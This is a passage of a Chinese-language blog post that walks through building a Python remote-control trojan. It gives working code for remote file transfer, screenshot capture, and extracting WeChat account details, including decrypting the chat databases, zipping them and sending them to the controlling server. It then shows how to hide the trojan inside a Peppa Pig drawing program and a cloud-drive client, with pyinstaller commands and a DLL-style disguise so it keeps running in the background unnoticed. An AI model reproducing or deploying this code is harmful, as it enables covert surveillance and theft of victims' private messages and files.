class="string">b&#x27;&#x27;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        conn.send(<span class="string">b&#x27;file_not_exist&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214251.png" alt="下载文件"></p>
+<h3 id="远程上传文件"><a href="#远程上传文件" class="headerlink" title="远程上传文件"></a>远程上传文件</h3><p>在这一部分，整体的流程和上面的远程文件下载基本一致，就是将上方服务端和客户端的流程对调<br>这里就不过多介绍，代码是一样的<br>在此程序中使用<code>put 文件名称</code>的形式，告诉双方我需要进入上传文件的流程<br><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214303.png" alt="上传文件"></p>
+<h3 id="远程获取屏幕截图"><a href="#远程获取屏幕截图" class="headerlink" title="远程获取屏幕截图"></a>远程获取屏幕截图</h3><p>Python获取屏幕截图的方式很多，比如PIL中的ImageGrab模块、windows API、PyQt、pyautogui等等<br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/c_lanxiaofang/article/details/126412158">参考文章</a><br>在此程序中使用了PIL中的ImageGrab模块，原因就是操作十分简单，缺点是效率较低，但是对于我们这个程序来说，几乎感觉不出差别<br>ImageGrab模块只需要两条命令就能搞定全屏截图，十分方便</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">im = ImageGrab.grab()</span><br><span class="line">im.save(file_name)</span><br></pre></td></tr></table></figure>
+<p>远程获取屏幕截图的整体流程和框架：</p>
+<div class="mermaid-wrap"><pre class="mermaid-src" hidden>
+  graph TB
+a[服务端发送截屏指令并进入截屏流程]--&gt;b[客户端接收截屏指令并进入截屏流程]
+b--&gt;c[服务端发送&#39;start&#39;指令]
+c--&gt;d[客户端端接收&#39;start&#39;指令并截屏保存文件]
+d--&gt;f[进入get下载文件流程]
+c--&gt;f
+f--&gt;e[客户端删除截屏文件,双方退出截屏流程]
+  </pre></div>
+
+<p>在此程序中，使用<code>screen</code>的方式告诉双方，我需要进行截屏的流程<br><strong>Server端screen函数：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">screen_shot</span>(<span class="params">conn</span>):  </span><br><span class="line">    rev = conn.recv(<span class="number">1024</span>)  </span><br><span class="line">    <span class="keyword">if</span> rev != <span class="string">b&#x27;screen&#x27;</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;截图失败&#x27;</span>)  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    conn.send(<span class="string">b&#x27;start&#x27;</span>)  </span><br><span class="line">    get_file(conn)</span><br></pre></td></tr></table></figure>
+<p><strong>Client端screen函数：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">screen_shot</span>(<span class="params">conn</span>):  </span><br><span class="line">    conn.send(<span class="string">b&#x27;screen&#x27;</span>)  </span><br><span class="line">    rev = conn.recv(<span class="number">1024</span>)  </span><br><span class="line">    <span class="keyword">if</span> rev != <span class="string">b&#x27;start&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="comment"># 截图并发生到服务端  </span></span><br><span class="line">    im = ImageGrab.grab()  </span><br><span class="line">    <span class="comment"># 截屏命名为当前时间  </span></span><br><span class="line">    file_name = time.strftime(<span class="string">&quot;%Y-%m-%d %H-%M-%S&quot;</span>, time.localtime()) + <span class="string">&#x27;.png&#x27;</span>  </span><br><span class="line">    im.save(file_name)  </span><br><span class="line">    get_file(conn, file_name)  </span><br><span class="line">    <span class="comment"># 删除本地截图  </span></span><br><span class="line">    os.remove(file_name)</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214314.png" alt="截屏"><br><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214330.png" alt="截取的图片拉取到本地"></p>
+<h3 id="获取微信数据"><a href="#获取微信数据" class="headerlink" title="获取微信数据"></a>获取微信数据</h3><p>这里功能是基于Github开源项目：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/xaoyaoo/PyWxDump">PyWxDump</a><br>其提供了一系列获取微信数据信息、聊天记录等Python接口<br>利用这个python项目，可以很容易获取到微信数据<br>如 获取微信基本信息：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_wechat_info</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="comment"># 读取文件中的json数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;version_list.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        version_list = json.load(f)</span><br><span class="line">    <span class="comment"># 读取微信信息</span></span><br><span class="line">    wx_info = read_info(version_list, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(wx_info).startswith(<span class="string">&#x27;[-]&#x27;</span>):</span><br><span class="line">        conn.send(wx_info.encode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    pid = wx_info[<span class="number">0</span>][<span class="string">&#x27;pid&#x27;</span>]</span><br><span class="line">    version = wx_info[<span class="number">0</span>][<span class="string">&#x27;version&#x27;</span>]</span><br><span class="line">    account = wx_info[<span class="number">0</span>][<span class="string">&#x27;account&#x27;</span>]</span><br><span class="line">    mobile = wx_info[<span class="number">0</span>][<span class="string">&#x27;mobile&#x27;</span>]</span><br><span class="line">    name = wx_info[<span class="number">0</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    mail = wx_info[<span class="number">0</span>][<span class="string">&#x27;mail&#x27;</span>]</span><br><span class="line">    wxid = wx_info[<span class="number">0</span>][<span class="string">&#x27;wxid&#x27;</span>]</span><br><span class="line">    file_path = wx_info[<span class="number">0</span>][<span class="string">&#x27;filePath&#x27;</span>]</span><br><span class="line">    key = wx_info[<span class="number">0</span>][<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    wechat_files = <span class="built_in">str</span>(Path(file_path).parent)</span><br><span class="line">    content = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ================== wechat info ==================</span></span><br><span class="line"><span class="string">    [+] 进程号: <span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">    [+] 版本: <span class="subst">&#123;version&#125;</span></span></span><br><span class="line"><span class="string">    [+] 微信号: <span class="subst">&#123;account&#125;</span></span></span><br><span class="line"><span class="string">    [+] 手机号: <span class="subst">&#123;mobile&#125;</span></span></span><br><span class="line"><span class="string">    [+] 微信名: <span class="subst">&#123;name&#125;</span></span></span><br><span class="line"><span class="string">    [+] 邮箱: <span class="subst">&#123;mail&#125;</span></span></span><br><span class="line"><span class="string">    [+] 微信数据路径: <span class="subst">&#123;file_path&#125;</span></span></span><br><span class="line"><span class="string">    [+] wxid: <span class="subst">&#123;wxid&#125;</span></span></span><br><span class="line"><span class="string">    [+] key: <span class="subst">&#123;key&#125;</span></span></span><br><span class="line"><span class="string">    ================== wechat info ==================</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    conn.send(content.encode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> file_path, key</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214347.png" alt="获取微信基本信息"></p>
+<p>获取并解密微信数据库：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_wechat</span>(<span class="params">conn</span>):</span><br><span class="line">    file_path, key = get_wechat_info(conn)</span><br><span class="line">    <span class="keyword">if</span> file_path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 获取解密后的数据库路径</span></span><br><span class="line">    decrypted_path = conn.recv(<span class="number">1024</span>).decode(<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 创建解密后的数据库文件夹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(decrypted_path):</span><br><span class="line">        os.mkdir(decrypted_path)</span><br><span class="line">    <span class="comment"># 解密微信数据库</span></span><br><span class="line">    args = &#123;</span><br><span class="line">        <span class="string">&quot;mode&quot;</span>: <span class="string">&quot;decrypt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;key&quot;</span>: key,  <span class="comment"># 密钥</span></span><br><span class="line">        <span class="string">&quot;db_path&quot;</span>: file_path + <span class="string">&#x27;\\Msg&#x27;</span>,  <span class="comment"># 数据库路径</span></span><br><span class="line">        <span class="string">&quot;out_path&quot;</span>: decrypted_path  <span class="comment"># 输出路径（必须是目录）</span></span><br><span class="line">    &#125;</span><br><span class="line">    batch_decrypt(args[<span class="string">&quot;key&quot;</span>], args[<span class="string">&quot;db_path&quot;</span>], args[<span class="string">&quot;out_path&quot;</span>], <span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 打包压缩解密后的数据库并发送到服务端</span></span><br><span class="line">    zip_file_path = decrypted_path + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">    zip_file_name = Path(zip_file_path).name</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(zip_file_path):</span><br><span class="line">        os.remove(zip_file_path)</span><br><span class="line">    zip_dir(decrypted_path, zip_file_path)</span><br><span class="line">    pwd = os.getcwd()  <span class="comment"># 记录当前路径</span></span><br><span class="line">    os.chdir(<span class="built_in">str</span>(Path(decrypted_path).parent))  <span class="comment"># 切换到父目录</span></span><br><span class="line">    get_file(conn, <span class="built_in">str</span>(zip_file_name))</span><br><span class="line">    os.remove(zip_file_path)  <span class="comment"># 删除压缩包</span></span><br><span class="line">    shutil.rmtree(decrypted_path)  <span class="comment"># 删除解密后的数据库文件夹</span></span><br><span class="line">    os.chdir(pwd)  <span class="comment"># 切换回原路径</span></span><br><span class="line">    rev = conn.recv(<span class="number">1024</span>)  <span class="comment"># 接收服务端的确认信息</span></span><br><span class="line">    <span class="keyword">if</span> rev != <span class="string">b&#x27;get_db_ok&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 打包压缩FileStorage文件夹并发送到服务端</span></span><br><span class="line">    file_storage_path = file_path + <span class="string">&quot;\\FileStorage&quot;</span></span><br><span class="line">    zip_file_path = file_storage_path + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">    zip_file_name = Path(zip_file_path).name</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(zip_file_path):</span><br><span class="line">        os.remove(zip_file_path)</span><br><span class="line">    zip_dir(file_storage_path, zip_file_path)</span><br><span class="line">    pwd = os.getcwd()  <span class="comment"># 记录当前路径</span></span><br><span class="line">    os.chdir(file_path)  <span class="comment"># 切换到父目录</span></span><br><span class="line">    get_file(conn, <span class="built_in">str</span>(zip_file_name))</span><br><span class="line">    os.remove(zip_file_path)  <span class="comment"># 删除压缩包</span></span><br><span class="line">    os.chdir(pwd)  <span class="comment"># 切换回原路径</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214356.png" alt="获取微信聊天数据库"></p>
+<p>开启flask服务，查看微信聊天信息：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flask_show</span>():</span><br><span class="line">    <span class="comment"># 查看聊天记录</span></span><br><span class="line">    seg = <span class="built_in">input</span>(<span class="string">&#x27;[*] 请输入数据库分段号：&#x27;</span>)</span><br><span class="line">    args = &#123;</span><br><span class="line">        <span class="string">&quot;mode&quot;</span>: <span class="string">&quot;dbshow&quot;</span>,</span><br><span class="line">        <span class="string">&quot;msg_path&quot;</span>: <span class="built_in">str</span>(db_path) + <span class="string">f&#x27;\\Multi\\de_MSG<span class="subst">&#123;seg&#125;</span>.db&#x27;</span>,  <span class="comment"># 解密后的 MSG.db 的路径</span></span><br><span class="line">        <span class="string">&quot;micro_path&quot;</span>: <span class="built_in">str</span>(db_path) + <span class="string">&#x27;\\de_MicroMsg.db&#x27;</span>,  <span class="comment"># 解密后的 MicroMsg.db 的路径</span></span><br><span class="line">        <span class="string">&quot;media_path&quot;</span>: <span class="built_in">str</span>(db_path) + <span class="string">f&#x27;\\Multi\\de_MediaMSG<span class="subst">&#123;seg&#125;</span>.db&#x27;</span>,  <span class="comment"># 解密后的 MediaMSG.db 的路径</span></span><br><span class="line">        <span class="string">&quot;filestorage_path&quot;</span>: local_file_storage_path + <span class="string">&quot;\\FileStorage&quot;</span>  <span class="comment"># 文件夹 FileStorage 的路径（用于显示图片）</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 启动flask服务</span></span><br><span class="line">    <span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template, g</span><br><span class="line">    <span class="keyword">import</span> logging</span><br><span class="line">    app = Flask(__name__, template_folder=<span class="string">&#x27;./show_chat/templates&#x27;</span>)</span><br><span class="line">    <span class="comment"># 阻止flask在控制台输出日志</span></span><br><span class="line">    log = logging.getLogger(<span class="string">&#x27;werkzeug&#x27;</span>)</span><br><span class="line">    log.setLevel(logging.ERROR)</span><br><span class="line">    app.logger.setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.before_request</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">before_request</span>():</span><br><span class="line">        g.MSG_ALL_db_path = args[<span class="string">&quot;msg_path&quot;</span>]</span><br><span class="line">        g.MicroMsg_db_path = args[<span class="string">&quot;micro_path&quot;</span>]</span><br><span class="line">        g.MediaMSG_all_db_path = args[<span class="string">&quot;media_path&quot;</span>]</span><br><span class="line">        g.FileStorage_path = args[<span class="string">&quot;filestorage_path&quot;</span>]</span><br><span class="line">        g.USER_LIST = get_user_list(args[<span class="string">&quot;msg_path&quot;</span>], args[<span class="string">&quot;micro_path&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&#x27;/shutdown&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">shutdown</span>():</span><br><span class="line">        shutdown_func = request.environ.get(<span class="string">&#x27;werkzeug.server.shutdown&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> shutdown_func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Not running with the Werkzeug Server&#x27;</span>)</span><br><span class="line">        shutdown_func()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Server shutting down...&#x27;</span></span><br><span class="line"></span><br><span class="line">    app.register_blueprint(app_show_chat)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 查看聊天记录服务启动在 http://127.0.0.1:5000 &quot;</span>)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214405.png" alt="在浏览器中查看聊天记录"></p>
+<h2 id="木马程序"><a href="#木马程序" class="headerlink" title="木马程序"></a>木马程序</h2><h3 id="peppa-pig"><a href="#peppa-pig" class="headerlink" title="peppa-pig"></a>peppa-pig</h3><p>完成上面的几个功能就已经具备简单远控木马的特征了，接着就是需要将这个程序隐藏起来，让对方察觉不到这个程序的存在<br>我的思路是将这个远程控制的程序隐藏在其他应用中，并且以多线程或者多进程的方式异步的运行这个程序，并且在对方关闭应用之后，这个远程程序依旧能在后台运行<br>首先我找到一个利用海龟绘图绘制小猪佩奇的程序，程序是<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jackfrued/Python-100-Days">Python-100-Days</a>这个项目中，接着我将远控程序引入，以多线程的方式启动，最后将整个程序<a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/weixin_43804047/article/details/119704965">打包成exe可执行程序</a><br><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203844.png" alt="绘制小猪佩奇程序"><br>添加多线程代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    <span class="comment"># 多线程  </span></span><br><span class="line">    t1 = threading.Thread(target=peppa_pig)  </span><br><span class="line">    t2 = threading.Thread(target=client_main)  </span><br><span class="line">    t1.start()  </span><br><span class="line">    t2.start()  </span><br><span class="line">    t1.join()  </span><br><span class="line">    t2.join()</span><br></pre></td></tr></table></figure>
+<p>使用pyinstaller打包</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller <span class="operator">-F</span> <span class="literal">-w</span> <span class="literal">-n</span> pig <span class="literal">-i</span> icon.ico peppa_pig.py</span><br></pre></td></tr></table></figure>
+<p>需要加入资源时</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller <span class="operator">-F</span> <span class="literal">-w</span> <span class="literal">-n</span> pig <span class="literal">-i</span> .\icon.ico <span class="literal">--add-data</span>=<span class="string">&quot;.\assets\version_list.json;.&quot;</span> .\peppa_pig.py</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203909.png" alt="打包成exe文件"><br>对方点击运行这个程序之后，远程控制程序同时以线程的形式进行运行，当对象关闭绘图框时，远控程序的线程还是会在后台继续运行，对方只要不打开任务管理器时难以察觉到的<br><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203930.png" alt="在后台运行的pig.exe"></p>
+<h3 id="量子加密网盘客户端"><a href="#量子加密网盘客户端" class="headerlink" title="量子加密网盘客户端"></a>量子加密网盘客户端</h3><p>结合之前写的一个<a href="https://pi3yyy.love/archives/7c353064.html">量子加密网盘客户端</a>的项目，我也将木马引入<br>这次的引入方式同上面的有所不同，由于上面以多线程的方式引入，而在Windows任务管理器中只会显示进程，所以还是pig.exe的程序正在运行，对方容易察觉到<br>这个我们换个思路，先将远控程序打包成exe可执行文件，替换其图标为动态链接库的图标，并且将名字设置为很长的一串。<br>接着在量子加密网盘客户端程序中，以<font color="#00b0f0">多进程</font>的方式执行这个远控exe程序，最后将量子加密网盘客户端打包成exe文件，将远控程序藏在打包后的依赖文件夹中</p>
+<p>添加多进程代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">	<span class="comment"># 多进程</span></span><br><span class="line">    multiprocessing.freeze_support()  </span><br><span class="line">    multiprocessing.Process(target=run_client).start()  </span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+<p>使用pyinstaller进行打包</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller <span class="literal">-D</span> <span class="literal">-w</span> <span class="literal">-n</span> QE_Network_Drive <span class="literal">-i</span> icon.ico flet_GUI.py</span><br></pre></td></tr></table></figure>
+<p>在这个过程中，我尝试了很多的办法，都会出现一个问题：在Pycharm下运行没有问题，但是打包后运行exe程序，整个电脑直接卡死，内存爆满，最后直接重启。<br>解决办法就是<a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/Owen_goodman/article/details/115521388">使用multiprocessing.freeze_support()</a><br><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201225942.png" alt="打包之后文件结构"><br><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201230034.png" alt="隐藏在依赖文件中的远控程序"><br><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201230240.png" alt="关闭云盘客户端后依旧在后台运行的远控程序"></p>
+<p>不过后续还是需要将这个远控程序图标和名称改的更加合适一点，毕竟dll动态链接库怎么可能在后台运行</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整个项目或者说是程序，总体上比较简单，没有什么很难的点，在这个过程中用到最多的就是<strong>计算机网络</strong>和<strong>网络编程</strong>中的知识点，于此同时，最后部分也涉及到了Python<strong>异步编程</strong>，<strong>多线程</strong>，<strong>多进程</strong>以及<strong>协程</strong>的概念，完成这个程序也算是巩固和补充了这些方面的知识，弥补了一些不懂的地方，现在写下来也算是回顾总结学到的知识点。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener external nofollow noreferrer" href="https://pi3-l22.github.io/">LiuChao</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://pi3yyy.love/archives/6cb7cff5.html">https://pi3yyy.love/archives/6cb7cff5.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://pi3yyy.love" target="_blank">Pi3's Notebook</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Python/">Python</a><a class="post-meta__tags" href="/tags/Socket/">Socket</a><a class="post-meta__tags" href="/tags/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/">远程控制</a><a class="post-meta__tags" href="/tags/%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/">远控木马</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/23408978.html" title="Netcat工具的简单使用"><img class="cover" src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/banner7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Netcat工具的简单使用</div></div></a></div><div class="next-post pull-right"><a href="/archives/82146f84.html" title="基于UDP的多人在线聊天室"><img class="cover" src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">基于UDP的多人在线聊天室</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/archives/8630530e.html" title="不同网络架构下文件下载服务协议设计"><img class="cover" src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/pi3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-20</div><div class="title">不同网络架构下文件下载服务协议设计</div></div></a></div><div><a href="/archives/82146f84.html" title="基于UDP的多人在线聊天室"><img class="cover" src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-07</div><div class="title">基于UDP的多人在线聊天室</div></div></a></div><div><a href="/archives/d9a4c6ca.html" title="Python爬虫之蓝奏云文件批量下载"><img class="cover" src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/pi33.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-07</div><div class="title">Python爬虫之蓝奏云文件批量下载</div></div></a></div><div><a href="/archives/d604709c.html" title="微信定时发送倒数日"><img class="cover" src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/banner11.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-20</div><div class="title">微信定时发送倒数日</div></div></a></div><div><a href="/archives/7c353064.html" title="量子加解密方法及云盘桌面客户端"><img class="cover" src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/banner8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-29</div><div class="title">量子加解密方法及云盘桌面客户端</div></div></a></div><div><a href="/archives/a0f6d86b.html" title="Neo4j安装与使用"><img class="cover" src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/pi3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-24</div><div class="title">Neo4j安装与使用</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC81OTIyNi8zNTY4OA=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/logo.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LiuChao</div><div class="author-info__description">enjoy life, enjoy coding</div></div><div 